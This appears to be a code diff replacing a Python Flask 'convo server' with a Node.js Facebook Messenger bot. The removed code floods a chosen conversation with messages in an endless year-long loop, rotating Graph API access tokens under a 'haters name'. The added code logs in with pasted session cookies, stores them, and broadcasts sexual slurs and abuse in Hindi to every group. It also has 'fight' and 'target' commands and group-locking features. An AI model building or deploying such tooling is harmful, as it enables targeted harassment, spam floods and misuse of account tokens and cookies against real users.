@@ -1,552 +1,552 @@
-from flask import Flask, render_template_string, request, jsonify
-import requests
-import time
-import threading
-import random
-import string
-import os
-from datetime import datetime, timedelta
+const express = require('express');
+const bodyParser = require('body-parser');
+const login = require('ws3-fca');
+const fs = require('fs');
+const http = require('http');
+const { Server } = require('socket.io');
+const path = require('path');
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
 
-app = Flask(__name__)
-app.secret_key = 'your_secret_key_here'
+// --- GLOBAL STATE ---
+let botAPI = null;
+let adminID = null;
+let prefix = '/';
+let botNickname = 'BOT TAKLA';
 
-# Global dictionary to store active tasks
-active_tasks = {}
+let lockedGroups = {};
+let lockedNicknames = {};
+let lockedGroupPhoto = {};
+let fightSessions = {};
+let joinedGroups = new Set();
+let targetSessions = {};
+let nickLockEnabled = false;
+let nickRemoveEnabled = false;
+let gcAutoRemoveEnabled = false;
+let currentCookies = null;
+let reconnectAttempt = 0;
+const signature = `\n                      ♦♦♦♦♦\n            ༄༒R4JV33R S!NGH 🐉🐉✓™༄`;
+const separator = `\n---😈---😈---😈---😈---😈---😈---`;
 
-class MessageSender:
-    def __init__(self, task_key, tokens, convo_id, hatersname, lastname, delay, messages):
-        self.task_key = task_key
-        self.tokens = tokens
-        self.convo_id = convo_id
-        self.hatersname = hatersname
-        self.lastname = lastname
-        self.delay = delay
-        self.messages = messages
-        self.is_running = True
-        self.current_status = "Running"
-        self.sent_count = 0
-        self.token_index = 0
-        self.msg_index = 0
-        self.start_time = datetime.now()
-        self.expiry_time = self.start_time + timedelta(days=365)  # 1 year expiry
-        
-    def generate_message(self, message):
-        return f"{self.hatersname}___{message}___{self.lastname}"
+// --- UTILITY FUNCTIONS ---
+function emitLog(message, isError = false) {
+  const logMessage = `[${new Date().toISOString()}] ${isError ? '❌ ERROR: ' : '✅ INFO: '}${message}`;
+  console.log(logMessage);
+  io.emit('botlog', logMessage);
+}
+
+function saveCookies() {
+  if (!botAPI) {
+    emitLog('❌ Cannot save cookies: Bot API not initialized.', true);
+    return;
+  }
+  try {
+    const newAppState = botAPI.getAppState();
+    const configToSave = {
+      botNickname: botNickname,
+      cookies: newAppState
+    };
+    fs.writeFileSync('config.json', JSON.stringify(configToSave, null, 2));
+    currentCookies = newAppState;
+    emitLog('✅ AppState saved successfully.');
+  } catch (e) {
+    emitLog('❌ Failed to save AppState: ' + e.message, true);
+  }
+}
+
+// --- BOT INITIALIZATION AND RECONNECTION LOGIC ---
+function initializeBot(cookies, prefix, adminID) {
+  emitLog('🚀 Initializing bot with ws3-fca...');
+  currentCookies = cookies;
+  reconnectAttempt = 0;
+
+  login({ appState: currentCookies }, (err, api) => {
+    if (err) {
+      emitLog(`❌ Login error: ${err.message}. Retrying in 10 seconds.`, true);
+      setTimeout(() => initializeBot(currentCookies, prefix, adminID), 10000);
+      return;
+    }
+
+    emitLog('✅ Bot successfully logged in.');
+    botAPI = api;
+    botAPI.setOptions({
+      selfListen: true,
+      listenEvents: true,
+      updatePresence: false
+    });
+
+    // Pehle thread list update karein, phir baaki kaam
+    updateJoinedGroups(api);
+
+    // Thoda sa delay ke baad baaki functions call karein
+    setTimeout(() => {
+        setBotNicknamesInGroups();
+        sendStartupMessage();
+        startListening(api);
+    }, 5000); // 5 seconds ka delay
+
+    // Periodically save cookies every 10 minutes
+    setInterval(saveCookies, 600000);
+  });
+}
+
+function startListening(api) {
+  api.listenMqtt(async (err, event) => {
+    if (err) {
+      emitLog(`❌ Listener error: ${err.message}. Attempting to reconnect...`, true);
+      reconnectAndListen();
+      return;
+    }
+
+    try {
+      if (event.type === 'message' || event.type === 'message_reply') {
+        await handleMessage(api, event);
+      } else if (event.logMessageType === 'log:thread-name') {
+        await handleThreadNameChange(api, event);
+      } else if (event.logMessageType === 'log:user-nickname') {
+        await handleNicknameChange(api, event);
+      } else if (event.logMessageType === 'log:thread-image') {
+        await handleGroupImageChange(api, event);
+      } else if (event.logMessageType === 'log:subscribe') {
+        await handleBotAddedToGroup(api, event);
+      }
+    } catch (e) {
+      emitLog(`❌ Handler crashed: ${e.message}. Event: ${event.type}`, true);
+    }
+  });
+}
+
+function reconnectAndListen() {
+  reconnectAttempt++;
+  emitLog(`🔄 Reconnect attempt #${reconnectAttempt}...`, false);
+
+  if (botAPI) {
+    try {
+      botAPI.stopListening();
+    } catch (e) {
+      emitLog(`❌ Failed to stop listener: ${e.message}`, true);
+    }
+  }
+
+  if (reconnectAttempt > 5) {
+    emitLog('❌ Maximum reconnect attempts reached. Restarting login process.', true);
+    initializeBot(currentCookies, prefix, adminID);
+  } else {
+    setTimeout(() => {
+      if (botAPI) {
+        startListening(botAPI);
+      } else {
+        initializeBot(currentCookies, prefix, adminID);
+      }
+    }, 5000);
+  }
+}
+
+async function setBotNicknamesInGroups() {
+  if (!botAPI) return;
+  try {
+    const threads = await botAPI.getThreadList(100, null, ['GROUP']);
+    const botID = botAPI.getCurrentUserID();
+    for (const thread of threads) {
+        try {
+            const threadInfo = await botAPI.getThreadInfo(thread.threadID);
+            if (threadInfo && threadInfo.nicknames && threadInfo.nicknames[botID] !== botNickname) {
+                await botAPI.changeNickname(botNickname, thread.threadID, botID);
+                emitLog(`✅ Bot's nickname set in group: ${thread.threadID}`);
+            }
+        } catch (e) {
+            emitLog(`❌ Error setting nickname in group ${thread.threadID}: ${e.message}`, true);
+        }
+        await new Promise(resolve => setTimeout(resolve, 500)); // Thoda sa delay
+    }
+  } catch (e) {
+    emitLog(`❌ Error getting thread list for nickname check: ${e.message}`, true);
+  }
+}
+
+async function sendStartupMessage() {
+  if (!botAPI) return;
+  const startupMessage = `😈𝗔𝗟𝗟 𝗛𝗔𝗧𝗘𝗥 𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗡𝗘 𝗩𝗔𝗟𝗔 𝗗𝗔𝗥𝗜𝗡𝗗𝗔 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘😈`;
+  try {
+    const threads = await botAPI.getThreadList(100, null, ['GROUP']);
+    for (const thread of threads) {
+        botAPI.sendMessage(startupMessage, thread.threadID)
+          .catch(e => emitLog(`❌ Error sending startup message to ${thread.threadID}: ${e.message}`, true));
+        await new Promise(resolve => setTimeout(resolve, 500)); // Thoda sa delay
+    }
+  } catch (e) {
+    emitLog(`❌ Error getting thread list for startup message: ${e.message}`, true);
+  }
+}
+
+async function updateJoinedGroups(api) {
+  try {
+    const threads = await api.getThreadList(100, null, ['GROUP']);
+    joinedGroups = new Set(threads.map(t => t.threadID));
+    emitGroups();
+    emitLog('✅ Joined groups list updated successfully.');
+  } catch (e) {
+    emitLog('❌ Failed to update joined groups: ' + e.message, true);
+  }
+}
+
+// --- WEB SERVER & DASHBOARD ---
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(express.static('public'));
+
+app.get('/', (req, res) => {
+  res.sendFile(__dirname + '/public/index.html');
+});
+
+app.post('/configure', (req, res) => {
+  try {
+    const cookies = JSON.parse(req.body.cookies);
+    prefix = req.body.prefix || '/';
+    adminID = req.body.adminID;
+
+    if (!Array.isArray(cookies) || cookies.length === 0) {
+      return res.status(400).send('Error: Invalid cookies format. Please provide a valid JSON array of cookies.');
+    }
+    if (!adminID) {
+      return res.status(400).send('Error: Admin ID is required.');
+    }
+
+    res.send('Bot configured successfully! Starting...');
+    initializeBot(cookies, prefix, adminID);
+  } catch (e) {
+    res.status(400).send('Error: Invalid configuration. Please check your input.');
+    emitLog('Configuration error: ' + e.message, true);
+  }
+});
+
+let loadedConfig = null;
+try {
+  if (fs.existsSync('config.json')) {
+    loadedConfig = JSON.parse(fs.readFileSync('config.json'));
+    if (loadedConfig.botNickname) {
+      botNickname = loadedConfig.botNickname;
+      emitLog('✅ Loaded bot nickname from config.json.');
+    }
+    if (loadedConfig.cookies && loadedConfig.cookies.length > 0) {
+        emitLog('✅ Cookies found in config.json. Initializing bot automatically...');
+        initializeBot(loadedConfig.cookies, prefix, adminID);
+    } else {
+        emitLog('❌ No cookies found in config.json. Please configure the bot using the dashboard.');
+    }
+  } else {
+    emitLog('❌ No config.json found. You will need to configure the bot via the dashboard.');
+  }
+} catch (e) {
+  emitLog('❌ Error loading config file: ' + e.message, true);
+}
+
+const PORT = process.env.PORT || 20018;
+server.listen(PORT, () => {
+  emitLog(`✅ Server running on port ${PORT}`);
+});
+
+io.on('connection', (socket) => {
+  emitLog('✅ Dashboard client connected');
+  socket.emit('botlog', `Bot status: ${botAPI ? 'Started' : 'Not started'}`);
+  socket.emit('groupsUpdate', Array.from(joinedGroups));
+});
+
+// The rest of the functions remain the same
+// ... all your handle* functions go here (handleMessage, handleGroupCommand, etc.)
+
+async function handleBotAddedToGroup(api, event) {
+  const { threadID, logMessageData } = event;
+  const botID = api.getCurrentUserID();
+
+  if (logMessageData.addedParticipants.some(p => p.userFbId === botID)) {
+    try {
+      await api.changeNickname(botNickname, threadID, botID);
+      await api.sendMessage(`😈HATER KI MAA CHODNE 𝗩𝗔𝗟𝗔 𝗗𝗔𝗥𝗜𝗡𝗗𝗔 𝗕𝗢𝗧 𝗛𝗘𝗥𝗘😈`, threadID);
+      emitLog(`✅ Bot added to new group: ${threadID}. Sent welcome message and set nickname.`);
+    } catch (e) {
+      emitLog('❌ Error handling bot addition: ' + e.message, true);
+    }
+  }
+}
+
+function emitGroups() {
+    io.emit('groupsUpdate', Array.from(joinedGroups));
+}
+
+// Updated helper function to format all messages
+async function formatMessage(api, event, mainMessage) {
+    const { senderID } = event;
+    let senderName = 'User';
+    try {
+      const userInfo = await api.getUserInfo(senderID);
+      senderName = userInfo && userInfo[senderID] && userInfo[senderID].name ? userInfo[senderID].name : 'User';
+    } catch (e) {
+      emitLog('❌ Error fetching user info: ' + e.message, true);
+    }
     
-    def send_message(self, token, message, msg_number):
-        headers = {
-            'Connection': 'keep-alive',
-            'Cache-Control': 'max-age=0',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
-            'referer': 'www.google.com'
-        }
-        
-        formatted_message = self.generate_message(message)
-        url = f"https://graph.facebook.com/v17.0/t_{self.convo_id}/"
-        
-        try:
-            params = {'access_token': token}
-            data = {'message': formatted_message}
-            
-            response = requests.post(url, headers=headers, params=params, data=data, timeout=30)
-            
-            # Server logs removed to avoid deployment platform issues
-            success_message = f"Message {msg_number} sent successfully"
-            
-            # Rate limiting - 2 messages per minute per token
-            time.sleep(30)
-            
-            return True, success_message
-        except Exception as e:
-            # Auto-solve errors by retrying
-            error_msg = f"Auto-solving error, retrying..."
-            time.sleep(5)  # Wait before retry
-            return False, error_msg
+    // Create the stylish, boxed-like mention text
+    const styledMentionBody = `             [🦋°🫧•𖨆٭ ${senderName}꙳○𖨆°🦋]`;
+    const fromIndex = styledMentionBody.indexOf(senderName);
     
-    def start_sending(self):
-        def run():
-            while self.is_running and datetime.now() < self.expiry_time:
-                try:
-                    if len(self.tokens) == 1:
-                        # Single token mode - infinite loop
-                        token = self.tokens[0]
-                        while self.is_running and datetime.now() < self.expiry_time:
-                            for i, message in enumerate(self.messages):
-                                if not self.is_running or datetime.now() >= self.expiry_time:
-                                    break
-                                success, log = self.send_message(token, message, self.sent_count + 1)
-                                self.sent_count += 1
-                                time.sleep(self.delay)
-                    
-                    else:
-                        # Multiple tokens mode - infinite loop
-                        while self.is_running and datetime.now() < self.expiry_time:
-                            token = self.tokens[self.token_index]
-                            message = self.messages[self.msg_index]
-                            
-                            success, log = self.send_message(token, message, self.sent_count + 1)
-                            self.sent_count += 1
-                            
-                            # Move to next token and message
-                            self.token_index = (self.token_index + 1) % len(self.tokens)
-                            self.msg_index = (self.msg_index + 1) % len(self.messages)
-                            
-                            time.sleep(self.delay)
-                
-                except Exception as e:
-                    # Auto-solve any unexpected errors
-                    time.sleep(10)
-                    continue
-            
-            # Auto-cleanup after 1 year or when stopped
-            if self.task_key in active_tasks:
-                del active_tasks[self.task_key]
-        
-        thread = threading.Thread(target=run)
-        thread.daemon = True
-        thread.start()
+    // Create the complete mention object
+    const mentionObject = {
+        tag: senderName,
+        id: senderID,
+        fromIndex: fromIndex
+    };
+
+    const finalMessage = `${styledMentionBody}\n${mainMessage}${signature}${separator}`;
+
+    return {
+        body: finalMessage,
+        mentions: [mentionObject]
+    };
+}
+
+async function handleMessage(api, event) {
+  try {
+    const { threadID, senderID, body, mentions } = event;
+    const isAdmin = senderID === adminID;
     
-    def stop(self):
-        self.is_running = False
-        self.current_status = "Stopped"
+    let replyMessage = '';
+    let isReply = false;
 
-def generate_task_key():
-    return f"RAJ_[{''.join(random.choices(string.digits, k=10))}]"
+    // First, check for mention of the admin
+    if (Object.keys(mentions || {}).includes(adminID)) {
+      const abuses = [
+        "Oye mere boss ko gali dega to teri bah.. chod dunga!",
+        "Mai tere baap ko chod du ga bsdike!",
+        "Ran..ke mdrxhod teri ma ka b..da!",
+        "Teri ma ki ch..tere baap ka nokar nahi hu randi ke!"
+      ];
+      const randomAbuse = abuses[Math.floor(Math.random() * abuses.length)];
+      
+      const formattedAbuse = await formatMessage(api, event, randomAbuse);
+      return await api.sendMessage(formattedAbuse, threadID);
+    }
 
-# Cleanup function for expired tasks
-def cleanup_expired_tasks():
-    while True:
-        try:
-            current_time = datetime.now()
-            expired_tasks = []
-            for task_key, task in active_tasks.items():
-                if current_time >= task.expiry_time:
-                    expired_tasks.append(task_key)
-            
-            for task_key in expired_tasks:
-                if task_key in active_tasks:
-                    del active_tasks[task_key]
-        except:
-            pass
-        time.sleep(3600)  # Check every hour
+    // Now, check for commands and trigger words
+    if (body) {
+      const lowerCaseBody = body.toLowerCase();
+      
+      if (lowerCaseBody.includes('mkc')) {
+        replyMessage = `😈𝗕𝗢𝗟 𝗕𝗢𝗫𝗗𝗜𝗞𝗘 𝗞𝗬𝗔 𝗞𝗔𝗔𝗠 𝗛𝗔𝗜😈`;
+        isReply = true;
+      } else if (lowerCaseBody.includes('randi')) {
+        replyMessage = `😬𝗧𝗨 𝗥𝗔𝗡𝗗𝗜 𝗧𝗘𝗥𝗜 𝗡𝗔𝗡𝗜 𝗥𝗔𝗡𝗗𝗜😬`;
+        isReply = true;
+      } else if (lowerCaseBody.includes('teri maa chod dunga')) {
+        replyMessage = `😜𝗧𝗘𝗥𝗘 𝗦𝗘 𝗖𝗛𝗜𝗡𝗧𝗶  𝗡𝗔𝗛𝗜 𝗖𝗛𝗨𝗗𝗧𝗜 𝗔𝗨𝗥 𝗧𝗨 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗 𝗗𝗘𝗚𝗔😜`;
+        isReply = true;
+      } else if (lowerCaseBody.includes('chutiya')) {
+        replyMessage = `😭𝗧𝗨 𝗖𝗛𝗨𝗧𝗜𝗬𝗔 𝗧𝗘𝗥𝗔 𝗕𝗔𝗔𝗣 𝗖𝗛𝗨𝗧𝗜𝗬𝗔 𝗧𝗘𝗥𝗔 𝗣𝗨𝗥𝗔 𝗞𝗛𝗔𝗡𝗗𝗔𝗡 𝗖𝗛𝗨𝗧𝗜𝗬𝗔 𝗡𝗜𝗞𝗔𝗟 𝗠𝗔𝗗𝗔𝗥𝗫𝗖𝗛𝗢𝗗😭`;
+        isReply = true;
+      } else if (lowerCaseBody.includes('boxdika')) {
+        replyMessage = `🥺𝗟𝗢𝗛𝗘 𝗞𝗔 𝗟𝗨𝗡𝗗 𝗛𝗔𝗜 𝗠𝗘𝗥𝗔 𝗚𝗔𝗥𝗔𝗠 𝗞𝗔𝗥 𝗞𝗘 𝗚𝗔𝗔𝗡𝗗 𝗠𝗔𝗜 𝗗𝗘 𝗗𝗨𝗚𝗔 🥺`;
+        isReply = true;
+      } else if (lowerCaseBody.trim() === 'bot') {
+        const botResponses = [
+            `😈𝗕𝗢𝗟 𝗕𝗢𝗫𝗗𝗜𝗞𝗘 𝗞𝗬𝗔 𝗞𝗔𝗔𝗠 𝗛𝗔𝗜😈`,
+            `😈𝗔𝗕𝗘 𝗕𝗢𝗧 𝗕𝗢𝗧 𝗡𝗔 𝗞𝗔𝗥 𝗧𝗘𝗥𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗔𝗔𝗥 𝗟𝗨𝗚𝗔 𝗠𝗔𝗜😈`,
+            `😜𝗕𝗢𝗟 𝗞𝗜𝗦𝗞𝗜 𝗠𝗔𝗔 𝗖𝗛𝗢𝗗𝗡𝗜 𝗛𝗔𝗜😜`,
+            `🙈𝗝𝗔𝗬𝗔𝗗𝗔 𝗕𝗢𝗧 𝗕𝗢𝗧 𝗕𝗢𝗟𝗘𝗚𝗔 𝗧𝗢 𝗧𝗘𝗥𝗜 𝗚𝗔𝗔𝗡𝗗 𝗠𝗔𝗜 𝗣𝗘𝗧𝗥𝗢𝗟 𝗗𝗔𝗔𝗟 𝗞𝗘 𝗝𝗔𝗟𝗔 𝗗𝗨𝗚𝗔😬`,
+            `😜𝗧𝗘𝗥𝗜 𝗠𝗞𝗖 𝗗𝗢𝗦𝗧😜`,
+            `🙊𝗕𝗢𝗧 𝗡𝗔𝗛𝗜 𝗠𝗔𝗜 𝗧𝗘𝗥𝗔 𝗝𝗜𝗝𝗔 𝗛𝗨🙊`,
+            `😈𝗔𝗕𝗘 𝗞𝗔𝗧𝗘 𝗟𝗨𝗡𝗗 𝗞𝗘 𝗞𝗬𝗔 𝗕𝗢𝗧 𝗕𝗢𝗧 𝗞𝗔𝗥 𝗥𝗔 𝗛𝗔𝗜😈`,
+            `🥲𝗖𝗛𝗔𝗟 𝗔𝗣𝗡𝗜 𝗞𝗔𝗟𝗜 𝗚𝗔𝗔𝗡𝗗 𝗗𝗜𝗞𝗛𝗔🥲`
+        ];
+        replyMessage = botResponses[Math.floor(Math.random() * botResponses.length)];
+        isReply = true;
+      }
+      
+      if (isReply) {
+          const formattedReply = await formatMessage(api, event, replyMessage);
+          return await api.sendMessage(formattedReply, threadID);
+      }
+    }
 
-# Start cleanup thread
-cleanup_thread = threading.Thread(target=cleanup_expired_tasks)
-cleanup_thread.daemon = True
-cleanup_thread.start()
+    // Now, handle commands
+    if (!body || !body.startsWith(prefix)) return;
+    const args = body.slice(prefix.length).trim().split(/ +/);
+    const command = args.shift().toLowerCase();
 
-# HTML Template (same as before, but I'll include a simplified version)
-HTML_TEMPLATE = '''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ROHIT SINGH CONVO SERVER</title>
-    <style>
-        body {
-            background: linear-gradient(135deg, #ffffff 0%, #e8f5e8 100%);
-            font-family: 'Arial', sans-serif;
-            margin: 0;
-            padding: 20px;
-            color: #333;
+    // Command-specific replies will also be sent with the new format
+    let commandReply = '';
+
+    switch (command) {
+      case 'group':
+        await handleGroupCommand(api, event, args, isAdmin);
+        return;
+      case 'nickname':
+        await handleNicknameCommand(api, event, args, isAdmin);
+        return;
+      case 'botnick':
+        await handleBotNickCommand(api, event, args, isAdmin);
+        return;
+      case 'tid':
+        commandReply = `Group ID: ${threadID}`;
+        break;
+      case 'uid':
+        if (Object.keys(mentions || {}).length > 0) {
+          const mentionedID = Object.keys(mentions)[0];
+          commandReply = `User ID: ${mentionedID}`;
+        } else {
+          commandReply = `Your ID: ${senderID}`;
         }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
-            border: 3px solid #4CAF50;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            padding-bottom: 20px;
-            border-bottom: 2px solid #4CAF50;
-        }
-        
-        .header h1 {
-            color: #2E7D32;
-            font-weight: bold;
-            font-size: 2.5em;
-            margin: 0;
-            text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
-        }
-        
-        .header h2 {
-            color: #388E3C;
-            font-weight: bold;
-            margin: 10px 0;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-            padding: 15px;
-            background: #f9fff9;
-            border-radius: 10px;
-            border-left: 4px solid #4CAF50;
-        }
-        
-        label {
-            font-weight: bold;
-            display: block;
-            margin-bottom: 8px;
-            color: #2E7D32;
-            font-size: 1.1em;
-        }
-        
-        input, select, textarea {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #4CAF50;
-            border-radius: 8px;
-            font-size: 16px;
-            box-sizing: border-box;
-            background: #fff;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
-            color: white;
-            padding: 15px 30px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 18px;
-            font-weight: bold;
-            margin: 10px 5px;
-            transition: all 0.3s ease;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        .btn-stop {
-            background: linear-gradient(135deg, #f44336 0%, #c62828 100%);
-        }
-        
-        .task-section {
-            margin-top: 30px;
-            padding: 20px;
-            background: #f1f8e9;
-            border-radius: 10px;
-            border: 2px solid #C8E6C9;
-        }
-        
-        .log-section {
-            margin-top: 20px;
-            padding: 15px;
-            background: #000;
-            color: #00ff00;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-            height: 200px;
-            overflow-y: auto;
-            border: 2px solid #4CAF50;
-        }
-        
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            padding: 20px;
-            background: #2E7D32;
-            color: white;
-            border-radius: 10px;
-            font-weight: bold;
-        }
-        
-        .note {
-            background: #FFF3E0;
-            border: 2px solid #FF9800;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 15px 0;
-            font-weight: bold;
-            text-align: center;
-        }
-        
-        .active-tasks {
-            background: #E8F5E9;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 10px 0;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>ROHIT SINGH CONVO SERVER</h1>
-            <h2>Infinite Message Sending System</h2>
-        </div>
-        
-        <div class="note">
-            🚀 TASKS WILL RUN FOR 1 YEAR AUTOMATICALLY 🚀
-        </div>
+        break;
+      case 'fyt':
+        await handleFightCommand(api, event, args, isAdmin);
+        return;
+      case 'stop':
+        await handleStopCommand(api, event, isAdmin);
+        return;
+      case 'target':
+        await handleTargetCommand(api, event, args, isAdmin);
+        return;
+      case 'help':
+        await handleHelpCommand(api, event);
+        return;
+      case 'photolock':
+        await handlePhotoLockCommand(api, event, args, isAdmin);
+        return;
+      case 'gclock':
+        await handleGCLock(api, event, args, isAdmin);
+        return;
+      case 'gcremove':
+        await handleGCRemove(api, event, isAdmin);
+        return;
+      case 'nicklock':
+        await handleNickLock(api, event, args, isAdmin);
+        return;
+      case 'nickremoveall':
+        await handleNickRemoveAll(api, event, isAdmin);
+        return;
+      case 'nickremoveoff':
+        await handleNickRemoveOff(api, event, isAdmin);
+        return;
+      case 'status':
+        await handleStatusCommand(api, event, isAdmin);
+        return;
 
-        <form id="messageForm">
-            <div class="form-group">
-                <label>1. Token Type:</label>
-                <select id="tokenType" name="token_type" onchange="toggleTokenInput()">
-                    <option value="single">Single Token</option>
-                    <option value="file">Token File</option>
-                </select>
-            </div>
-
-            <div class="form-group" id="singleTokenGroup">
-                <label>Single Token:</label>
-                <input type="text" name="single_token" placeholder="Enter single token">
-            </div>
-
-            <div class="form-group" id="tokenFileGroup" style="display: none;">
-                <label>Token File:</label>
-                <input type="file" name="token_file" accept=".txt">
-            </div>
-
-            <div class="form-group">
-                <label>2. Conversation ID:</label>
-                <input type="text" name="convo_id" placeholder="Enter conversation ID" required>
-            </div>
-
-            <div class="form-group">
-                <label>3. Haters Name:</label>
-                <input type="text" name="hatersname" placeholder="Enter haters name" required>
-            </div>
-
-            <div class="form-group">
-                <label>4. Last Name:</label>
-                <input type="text" name="lastname" placeholder="Enter last name" required>
-            </div>
-
-            <div class="form-group">
-                <label>5. Time Delay (seconds):</label>
-                <input type="number" name="delay" value="1" min="1" required>
-            </div>
-
-            <div class="form-group">
-                <label>6. Messages File:</label>
-                <input type="file" name="msg_file" accept=".txt" required>
-            </div>
-
-            <button type="button" class="btn" onclick="startTask()">Start Infinite Task</button>
-        </form>
-
-        <div class="task-section">
-            <h3>Task Management</h3>
-            <div id="taskStatus"></div>
-            <div id="activeTasks" class="active-tasks"></div>
-            <button type="button" class="btn btn-stop" onclick="stopAllTasks()">Stop All Tasks</button>
-        </div>
-
-        <div class="log-section" id="logs">
-            System Ready - Tasks will run for 1 year automatically...
-        </div>
-
-        <div class="footer">
-            DEVELOPER:- VAMPIRE RULEX L3G3ND R4J MISHR4
-        </div>
-    </div>
-
-    <script>
-        function toggleTokenInput() {
-            const tokenType = document.getElementById('tokenType').value;
-            document.getElementById('singleTokenGroup').style.display = 
-                tokenType === 'single' ? 'block' : 'none';
-            document.getElementById('tokenFileGroup').style.display = 
-                tokenType === 'file' ? 'block' : 'none';
+      default:
+        if (!isAdmin) {
+          commandReply = `Teri ma ki ch.. tere baap ka nokar nahi hu randi ke!`;
+        } else {
+          commandReply = `Ye h mera prefix ${prefix} ko prefix ho use lgake bole ye h mera prefix or devil mera boss h ab bol mdrxhod kya kam h tujhe mujhse bsdike`;
         }
-
-        function addLog(message) {
-            const logs = document.getElementById('logs');
-            const timestamp = new Date().toLocaleTimeString();
-            logs.innerHTML += `[${timestamp}] ${message}\\n`;
-            logs.scrollTop = logs.scrollHeight;
-        }
-
-        function startTask() {
-            const formData = new FormData(document.getElementById('messageForm'));
-            
-            fetch('/start_task', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    addLog('✅ ' + data.message);
-                    addLog('🔄 Task will run for 1 year automatically');
-                    updateActiveTasks();
-                } else {
-                    addLog('❌ Error: ' + data.message);
-                }
-            })
-            .catch(error => {
-                addLog('❌ Error: ' + error);
-            });
-        }
-
-        function stopTask(taskKey) {
-            fetch('/stop_task', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({task_key: taskKey})
-            })
-            .then(response => response.json())
-            .then(data => {
-                addLog('🛑 ' + data.message);
-                updateActiveTasks();
-            });
-        }
-
-        function stopAllTasks() {
-            fetch('/get_active_tasks')
-            .then(response => response.json())
-            .then(data => {
-                data.tasks.forEach(task => {
-                    stopTask(task.task_key);
-                });
-            });
-        }
-
-        function updateActiveTasks() {
-            fetch('/get_active_tasks')
-            .then(response => response.json())
-            .then(data => {
-                const tasksDiv = document.getElementById('activeTasks');
-                if (data.tasks.length === 0) {
-                    tasksDiv.innerHTML = 'No active tasks';
-                } else {
-                    let html = '<h4>Active Tasks:</h4>';
-                    data.tasks.forEach(task => {
-                        html += `
-                            <div style="margin: 10px 0; padding: 10px; background: #C8E6C9; border-radius: 5px;">
-                                <strong>${task.task_key}</strong><br>
-                                Status: ${task.status} | Sent: ${task.sent_count}
-                                <button onclick="stopTask('${task.task_key}')" style="float: right; background: #f44336; color: white; border: none; padding: 5px 10px; border-radius: 3px; cursor: pointer;">Stop</button>
-                            </div>
-                        `;
-                    });
-                    tasksDiv.innerHTML = html;
-                }
-            });
-        }
-
-        // Update tasks every 5 seconds
-        setInterval(updateActiveTasks, 5000);
-        
-        // Initial call
-        toggleTokenInput();
-        updateActiveTasks();
-    </script>
-</body>
-</html>
-'''
-
-@app.route('/')
-def index():
-    return render_template_string(HTML_TEMPLATE)
-
-@app.route('/start_task', methods=['POST'])
-def start_task():
-    try:
-        # Get form data
-        token_type = request.form.get('token_type')
-        tokens = []
-        
-        if token_type == 'single':
-            token = request.form.get('single_token')
-            if token:
-                tokens = [token.strip()]
-        else:
-            token_file = request.files.get('token_file')
-            if token_file:
-                content = token_file.read().decode('utf-8')
-                tokens = [line.strip() for line in content.split('\n') if line.strip()]
-        
-        convo_id = request.form.get('convo_id')
-        hatersname = request.form.get('hatersname')
-        lastname = request.form.get('lastname')
-        delay = float(request.form.get('delay'))
-        
-        # Read messages file
-        msg_file = request.files.get('msg_file')
-        messages = []
-        if msg_file:
-            content = msg_file.read().decode('utf-8')
-            messages = [line.strip() for line in content.split('\n') if line.strip()]
-        
-        if not tokens or not messages or not convo_id:
-            return jsonify({'success': False, 'message': 'Missing required fields'})
-        
-        # Generate task key
-        task_key = generate_task_key()
-        
-        # Create and start message sender
-        sender = MessageSender(task_key, tokens, convo_id, hatersname, lastname, delay, messages)
-        active_tasks[task_key] = sender
-        sender.start_sending()
-        
-        return jsonify({
-            'success': True, 
-            'task_key': task_key,
-            'message': f'Infinite task started successfully! Key: {task_key}'
-        })
+    }
     
-    except Exception as e:
-        return jsonify({'success': False, 'message': f'Error: {str(e)}'})
+    // Send final command reply with the new format
+    if (commandReply) {
+        const formattedReply = await formatMessage(api, event, commandReply);
+        await api.sendMessage(formattedReply, threadID);
+    }
 
-@app.route('/stop_task', methods=['POST'])
-def stop_task():
-    try:
-        task_key = request.json.get('task_key')
-        if task_key in active_tasks:
-            active_tasks[task_key].stop()
-            del active_tasks[task_key]
-            return jsonify({'success': True, 'message': 'Task stopped successfully'})
-        else:
-            return jsonify({'success': False, 'message': 'Task not found'})
-    except Exception as e:
-        return jsonify({'success': False, 'message': f'Error: {str(e)}'})
+  } catch (err) {
+    emitLog('❌ Error in handleMessage: ' + err.message, true);
+  }
+}
 
